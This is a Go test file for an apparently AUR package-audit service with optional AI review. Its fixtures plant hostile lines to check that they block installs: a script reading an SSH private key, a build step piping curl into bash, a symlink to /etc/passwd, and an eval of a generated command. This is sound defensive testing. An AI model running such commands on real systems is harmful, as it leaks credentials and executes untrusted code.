func TestHardCredentialBlockSkipsAIAndCannotBeApproved(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	if err := os.WriteFile(filepath.Join(root, "steal.sh"), []byte("cat ~/.ssh/id_ed25519\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	reviewer := &fakeReviewer{}
	service, err := NewAuditService(context.Background(), aiConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil {
		t.Fatal(err)
	}
	// A credential-path read is recognised, not enforced, so it blocks the
	// transaction pending a decision and is approvable once the user has read
	// the briefing.
	//
	// The AI reviewer runs and contributes context, and cannot clear the
	// finding: a verdict of "allow" over a critical deterministic finding must
	// not produce an allowed report. AI review only ever tightens.
	if status != 10 {
		t.Fatalf("an AI allow cleared a critical deterministic finding: status=%d", status)
	}
	if !report.ApprovalEligible {
		t.Fatal("a recognised pattern produced an unapprovable report; only structural properties may do that")
	}
}

// Structural properties are the ones an approval may never cross.
func TestStructuralEscapeCannotBeApproved(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	if err := os.Symlink("/etc/passwd", filepath.Join(root, "escape")); err != nil {
		t.Skipf("cannot create symlink: %v", err)
	}
	service, err := NewAuditService(context.Background(), aiConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil {
		t.Fatal(err)
	}
	if status != 10 || report.Decision != "block" {
		t.Fatalf("an escaping symlink did not block: status=%d decision=%q", status, report.Decision)
	}
	if report.ApprovalEligible {
		t.Fatal("an escaping symlink was approvable; structural properties must not be")
	}
}

func TestProviderMetadataChangeDegradesToDeterministicBriefing(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writePackageFixture(t, root)
	reviewer := &changingReviewer{}
	service, err := NewAuditService(context.Background(), aiConfig(), reviewer)
	if err != nil {
		t.Fatal(err)
	}
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil {
		t.Fatal(err)
	}
	if status != 0 || report.Decision != "allow" {
		t.Fatalf("a provider metadata change blocked a clean package: status=%d decision=%q", status, report.Decision)
	}
	if !strings.Contains(report.Reviewer.Error, "metadata changed") {
		t.Fatalf("the metadata change was not recorded: %q", report.Reviewer.Error)
	}
}

type changingReviewer struct{}

func (*changingReviewer) Probe(context.Context) (ProviderMetadata, error) {
	return ProviderMetadata{Provider: "codex", Transport: "cli", RuntimeVersion: "codex-cli before", Model: "gpt", Effort: "high", AdapterPolicy: "test-v1"}, nil
}
func (*changingReviewer) Review(context.Context, string, string, *brief.Inventory, ReviewOptions) (ProviderMetadata, []Verdict, error) {
	metadata, _ := (&changingReviewer{}).Probe(context.Background())
	metadata.RuntimeVersion = "codex-cli after"
	return metadata, []Verdict{{SchemaVersion: VerdictSchemaVersion, Verdict: "allow", Confidence: "high", Summary: "safe", Findings: []ReviewFinding{}, Guidance: []FindingGuidance{}, CoverageNotes: []string{}}}, nil
}

func writePackageFixture(t *testing.T, root string) {
	t.Helper()
	pkg := "pkgbase=demo\npkgver=1\npkgrel=1\nsource=(local.patch)\n"
	src := "pkgbase = demo\npkgver = 1\npkgrel = 1\nsource = local.patch\n"
	for name, body := range map[string]string{"PKGBUILD": pkg, ".SRCINFO": src, "local.patch": "safe patch\n"} {
		if err := os.WriteFile(filepath.Join(root, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
}

// writeBlockingFixture is a package whose deterministic finding blocks and is
// approvable: the ordinary "read it and decide" case.
func writeBlockingFixture(t *testing.T, root string) {
	t.Helper()
	pkg := "pkgbase=demo\npkgver=1\npkgrel=1\nsource=(local.patch)\nbuild() {\n  curl https://example.com/x | bash\n}\n"
	src := "pkgbase = demo\npkgver = 1\npkgrel = 1\nsource = local.patch\n"
	for name, body := range map[string]string{"PKGBUILD": pkg, ".SRCINFO": src, "local.patch": "safe patch\n"} {
		if err := os.WriteFile(filepath.Join(root, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
}

func findingByRule(findings []brief.Finding, rule string) *brief.Finding {
	for i := range findings {
		if findings[i].RuleID == rule {
			return &findings[i]
		}
	}
	return nil
}
func vendorTarBytes(t *testing.T, members map[string][]byte) []byte {
	t.Helper()
	var raw bytes.Buffer
	tw := tar.NewWriter(&raw)
	for name, body := range members {
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o755, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write(body); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return raw.Bytes()
}
func writeRemoteSourceFixture(t *testing.T, root string, archive []byte) {
	t.Helper()
	digest := safe.SHA256Bytes(archive)
	pkgbuild := "pkgbase=demo\npkgver=1\npkgrel=1\nsource=('https://vendor.example/source.tar')\nsha256sums=('" + digest + "')\n"
	srcinfo := "pkgbase = demo\npkgver = 1\npkgrel = 1\nsource = https://vendor.example/source.tar\nsha256sums = " + digest + "\n"
	for name, body := range map[string][]byte{"PKGBUILD": []byte(pkgbuild), ".SRCINFO": []byte(srcinfo), "source.tar": archive} {
		if err := os.WriteFile(filepath.Join(root, name), body, 0o600); err != nil {
			t.Fatal(err)
		}
	}
}

// Audit owns these boundary utilities: file copying, key ordering, and provider
// metadata.
func TestAuditSideBoundaryUtilities(t *testing.T) {
	source, target := filepath.Join(t.TempDir(), "source"), filepath.Join(t.TempDir(), "target")
	if err := os.WriteFile(source, []byte("copy"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := copyRegular(source, target, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := copyRegular(filepath.Dir(source), filepath.Join(t.TempDir(), "bad"), 0o600); err == nil {
		t.Fatal("non-regular copy source accepted")
	}
	withStateAndShare(t)
	packageRoot := t.TempDir()
	writePackageFixture(t, packageRoot)
	reviewer := NewReviewer(DefaultConfig())
	reviewer.Command = []string{os.Args[0], "-test.run=TestDispatcherHelperProcess"}
	t.Setenv("GO_WANT_DISPATCH_HELPER", "1")
	if _, err := reviewer.Probe(context.Background()); err != nil {
		t.Fatal(err)
	}
	service, err := NewAuditService(context.Background(), aiConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	if _, status, err := service.ScanDirectory(context.Background(), "pre", packageRoot, "demo"); err != nil || status != 0 {
		t.Fatalf("report fixture failed: status=%d err=%v", status, err)
	}
	if _, err := NewReportStore().Latest(); err != nil {
		t.Fatal(err)
	}
}

func tarBytes(t *testing.T, members map[string][]byte) []byte {
	t.Helper()
	var raw bytes.Buffer
	writer := tar.NewWriter(&raw)
	for name, body := range members {
		if err := writer.WriteHeader(&tar.Header{Name: name, Mode: 0o600, Size: int64(len(body)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := writer.Write(body); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return raw.Bytes()
}

func findingIDs(findings []brief.Finding) map[string]bool {
	ids := map[string]bool{}
	for _, finding := range findings {
		ids[finding.RuleID] = true
	}
	return ids
}

// TestOptionalProviderFailureKeepsTheUserDecision is release invariant 6 at the
// only point where it is worth anything.
//
// A non-structural deterministic high finding is an ordinary decision: the user
// reads it and may approve that exact snapshot. Enabling AI review and then
// losing the provider - probe, identity, or attestation - used to make the same
// finding unapprovable, so yay aborted without asking. Losing an optional
// component must not remove authority the user has when the component was never
// configured at all.
func TestOptionalProviderFailureKeepsTheUserDecision(t *testing.T) {
	for name, degrade := range map[string]func(*AuditService){
		"provider probe":       func(s *AuditService) { s.InitializationError = "provider compatibility probe failed" },
		"provider identity":    func(s *AuditService) { s.InitializationError = "provider identity validation failed" },
		"provider attestation": func(s *AuditService) { s.InitializationError = "provider attestation validation failed" },
	} {
		t.Run(name, func(t *testing.T) {
			withStateAndShare(t)
			root := t.TempDir()
			writeBlockingFixture(t, root)
			service, err := NewAuditService(context.Background(), aiConfig(), &fakeReviewer{})
			if err != nil {
				t.Fatal(err)
			}
			degrade(service)
			service.Reviewer = nil
			report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
			if err != nil {
				t.Fatal(err)
			}
			if status == 0 {
				t.Fatalf("the deterministic finding stopped blocking: %+v", report.Findings)
			}
			if !report.ApprovalEligible {
				t.Fatal("an optional provider failure removed the user's decision on a deterministic finding")
			}
			if report.Reviewer.Error == "" {
				t.Fatal("the briefing does not say the reviewer was lost")
			}
		})
	}
}

// The archive probe is the opposite case and must keep gating: without it
// nothing opened the archives, so there is no inspection to approve.
func TestUninspectedArchivesStillBlockApproval(t *testing.T) {
	withStateAndShare(t)
	root := t.TempDir()
	writeBlockingFixture(t, root)
	service, err := NewAuditService(context.Background(), aiConfig(), &fakeReviewer{})
	if err != nil {
		t.Fatal(err)
	}
	service.CoverageError = "archive probe unavailable: bsdtar missing"
	report, status, err := service.ScanDirectory(context.Background(), "pre", root, "demo")
	if err != nil || status == 0 {
		t.Fatalf("expected a block: status=%d err=%v", status, err)
	}
	if report.ApprovalEligible {
		t.Fatal("a package whose archives were never opened was offered for approval")
	}
}

// TestRecipePhaseIsReviewedOnlyWhenAsked binds the phase gate and, just as
// importantly, how it is reported.
//
// Every phase costs a provider round trip per package, and a transaction may
// hold ten of them. Clean recipes are therefore opt-in; high-severity recipes
// have a separate default-on guidance test below. A skipped clean phase must
// read as a choice, never as a failure, or it looks like AI review is broken.
func TestRecipePhaseIsReviewedOnlyWhenAsked(t *testing.T) {
	withStateAndShare(t)
	checkout := t.TempDir()
	writePackageFixture(t, checkout)

	for _, current := range []struct {
		name     string
		included bool
		calls    int
	}{
		{name: "off by default", included: false, calls: 0},
		{name: "opted in", included: true, calls: 1},
	} {
		t.Run(current.name, func(t *testing.T) {
			reviewer := &fakeReviewer{}
			cfg := aiConfig()
			cfg.Review.IncludeRecipePhase = current.included
			service, err := NewAuditService(context.Background(), cfg, reviewer)
			if err != nil {
				t.Fatal(err)
			}
			report, status, err := service.ScanDirectory(context.Background(), "pre", checkout, "demo")
			if err != nil || status != 0 {
				t.Fatalf("status=%d err=%v", status, err)
			}
			if reviewer.calls != current.calls {
				t.Errorf("provider called %d times, want %d", reviewer.calls, current.calls)
			}
			if current.included {
				if report.Reviewer.Skipped != "" {
					t.Errorf("an opted-in phase was reported as skipped: %q", report.Reviewer.Skipped)
				}
				return
			}
			if !strings.Contains(report.Reviewer.Skipped, "include_recipe_phase") {
				t.Errorf("the skip does not name the setting that controls it: %q", report.Reviewer.Skipped)
			}
			// A choice is not a degradation: Error stays empty, so the report
			// carries no DEGRADED stamp and the phase may still collapse.
			if report.Reviewer.Error != "" {
				t.Errorf("a configuration choice was recorded as an error: %q", report.Reviewer.Error)
			}
			rendered, role := aiReviewStatus(report, " · ")
			if role != "muted" || !strings.HasPrefix(rendered, "not run") {
				t.Errorf("skipped phase rendered as %q with role %q", rendered, role)
			}
		})
	}

	// The sources phase is the required gate and is never subject to this flag.
	reviewer := &fakeReviewer{}
	cfg := aiConfig()
	cfg.Review.IncludeRecipePhase = false
	service, err := NewAuditService(context.Background(), cfg, reviewer)
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := service.ScanDirectory(context.Background(), "post", checkout, "demo"); err != nil {
		t.Fatal(err)
	}
	if reviewer.calls == 0 {
		t.Fatal("the sources phase was skipped; only the recipe phase is optional")
	}
}

func TestHighRecipeFindingsTriggerGuidanceWithoutClearingTheDecision(t *testing.T) {
	for _, current := range []struct {
		name     string
		guidance bool
		calls    int
	}{
		{name: "default guidance", guidance: true, calls: 1},
		{name: "explicitly disabled", guidance: false, calls: 0},
	} {
		t.Run(current.name, func(t *testing.T) {
			withStateAndShare(t)
			checkout := t.TempDir()
			writePackageFixture(t, checkout)
			if err := os.WriteFile(filepath.Join(checkout, "generated.patch"), []byte("eval \"$generated_command\"\n"), 0o600); err != nil {
				t.Fatal(err)
			}
			reviewer := &fakeReviewer{}
			cfg := aiConfig()
			cfg.Review.IncludeRecipePhase = false
			cfg.Review.GuideDecisionFindings = current.guidance
			service, err := NewAuditService(context.Background(), cfg, reviewer)
			if err != nil {
				t.Fatal(err)
			}
			report, status, err := service.ScanDirectory(context.Background(), "pre", checkout, "demo")
			if err != nil || status != ExitPolicyBlock {
				t.Fatalf("high deterministic finding was not preserved: status=%d err=%v", status, err)
			}
			if reviewer.calls != current.calls {
				t.Fatalf("provider called %d times, want %d", reviewer.calls, current.calls)
			}
			if current.guidance && (len(report.Reviewer.Verdicts) != 1 || report.Reviewer.Skipped != "") {
				t.Fatalf("guidance was not recorded as a completed review: %+v", report.Reviewer)
			}
			if current.guidance {
				statusLine, _ := aiReviewStatus(report, " · ")
				if report.Reviewer.Trigger != reviewTriggerDecisionFindings || !strings.Contains(statusLine, "completed · triggered by findings") {
					t.Fatalf("conditional AI run did not explain its trigger: reviewer=%+v status=%q", report.Reviewer, statusLine)
				}
			}
			found := false
			for _, finding := range report.Findings {
				found = found || finding.RuleID == "dynamic-execution" && finding.Severity == "high"
			}
			if !found || report.Decision != "block" || !strings.Contains(report.Summary, "deterministic finding(s) at HIGH or above") {
				t.Fatalf("AI guidance cleared or obscured deterministic evidence: decision=%s summary=%q findings=%+v", report.Decision, report.Summary, report.Findings)
			}
		})
	}
}
